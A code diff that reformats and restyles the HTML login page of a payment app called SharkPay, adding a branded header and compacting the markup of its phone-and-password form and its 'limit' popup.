@@ -1,43 +1,42 @@
 <!doctype html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta
-      name="viewport"
-      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
-    />
-    <title>SharkPay - Login</title>
-    <link rel="stylesheet" href="../css/common.css" />
-    <link rel="stylesheet" href="../css/login.css" />
-    <!-- Lucide Icons -->
-    <script src="https://unpkg.com/lucide@latest"></script>
-  </head>
-  <body>
-    <div class="login-container">
-      <div class="header">LOG IN</div>
 
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>SharkPay - Login</title>
+  <link rel="stylesheet" href="../css/common.css" />
+  <link rel="stylesheet" href="../css/login.css" />
+  <!-- Lucide Icons -->
+  <script src="https://unpkg.com/lucide@latest"></script>
+</head>
+
+<body>
+  <div class="login-page">
+
+    <!-- Blue Header - Photo Exact Match -->
+    <div class="login-header">
+      <div class="login-header-left">
+        <div class="shark-logo">
+          <img src="https://i.imgur.com/8QZQZ8A.png" alt="SharkPay" class="shark-logo-img" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex'"/>
+          <div class="shark-logo-fallback">🦈</div>
+        </div>
+        <span class="header-brand-name">SharkPay</span>
+      </div>
+      <a href="#" class="download-btn">Download</a>
+    </div>
+
+    <!-- Login Form Container -->
+    <div class="login-container">
       <form id="loginForm">
         <div class="form-group">
           <i data-lucide="phone" class="input-icon"></i>
-          <input
-            type="tel"
-            id="mobile"
-            class="form-control"
-            placeholder="Enter Your Phone Number"
-            maxlength="10"
-            required
-          />
+          <input type="tel" id="mobile" class="form-control" placeholder="Enter Your Phone Number" maxlength="10" required />
         </div>
 
         <div class="form-group">
           <i data-lucide="lock" class="input-icon"></i>
-          <input
-            type="password"
-            id="password"
-            class="form-control"
-            placeholder="Enter Password"
-            required
-          />
+          <input type="password" id="password" class="form-control" placeholder="Enter Password" required />
         </div>
 
         <div class="register-forgot-row">
@@ -45,99 +44,33 @@
           <a href="#" class="forgot-link">Forget Password</a>
         </div>
 
-        <div
-          id="errorMessage"
-          class="hidden"
-          style="
-            color: red;
-            text-align: center;
-            margin-bottom: 20px;
-            font-size: 14px;
-          "
-        ></div>
+        <div id="errorMessage" class="error-msg hidden"></div>
 
         <div class="login-btn-container">
-          <button type="submit" class="btn-primary" id="loginBtn">
-            LOG IN
-          </button>
+          <button type="submit" class="btn-primary" id="loginBtn">LOG IN</button>
         </div>
       </form>
     </div>
 
     <!-- Limit Popup -->
-    <div
-      id="limitPopup"
-      style="
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0, 0, 0, 0.8);
-        z-index: 1000;
-        justify-content: center;
-        align-items: center;
-      "
-    >
-      <div
-        style="
-          background: #fff;
-          padding: 24px;
-          border-radius: 12px;
-          max-width: 90%;
-          width: 320px;
-          text-align: center;
-        "
-      >
-        <div style="margin-bottom: 16px; color: #f59e0b">
-          <i
-            data-lucide="alert-triangle"
-            style="width: 48px; height: 48px; margin: 0 auto"
-          ></i>
+    <div id="limitPopup" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:1000;justify-content:center;align-items:center;">
+      <div style="background:#fff;padding:24px;border-radius:12px;max-width:90%;width:320px;text-align:center;">
+        <div style="margin-bottom:16px;color:#f59e0b;">
+          <i data-lucide="alert-triangle" style="width:48px;height:48px;margin:0 auto"></i>
         </div>
-        <h3
-          style="
-            font-size: 18px;
-            margin-bottom: 12px;
-            font-weight: 600;
-            color: #1f2937;
-          "
-        >
-          Update Request Already Received
-        </h3>
-        <p
-          style="
-            font-size: 14px;
-            color: #4b5563;
-            margin-bottom: 16px;
-            line-height: 1.5;
-          "
-        >
-          Please wait some time. You can use another link:
-        </p>
-        <a
-          href="#"
-          id="telegramLimitLink"
-          style="
-            display: inline-block;
-            padding: 10px 16px;
-            background: #e0e7ff;
-            color: #4f46e5;
-            border-radius: 8px;
-            text-decoration: none;
-            font-weight: 600;
-            word-break: break-all;
-          "
-          >app-web.showpay-web.com</a
-        >
+        <h3 style="font-size:18px;margin-bottom:12px;font-weight:600;color:#1f2937;">Update Request Already Received</h3>
+        <p style="font-size:14px;color:#4b5563;margin-bottom:16px;line-height:1.5;">Please wait some time. You can use another link:</p>
+        <a href="#" id="telegramLimitLink" style="display:inline-block;padding:10px 16px;background:#e0e7ff;color:#4f46e5;border-radius:8px;text-decoration:none;font-weight:600;word-break:break-all;">app-web.sharkpay-app.com</a>
       </div>
     </div>
 
-    <script type="module" src="../js/config/supabase.js"></script>
-    <script type="module" src="../js/auth/login.js"></script>
-    <script>
-      lucide.createIcons();
-    </script>
-  </body>
+  </div>
+
+  <script type="module" src="../js/config/supabase.js"></script>
+  <script type="module" src="../js/auth/login.js"></script>
+  <script>
+    lucide.createIcons();
+  </script>
+</body>
+
 </html>
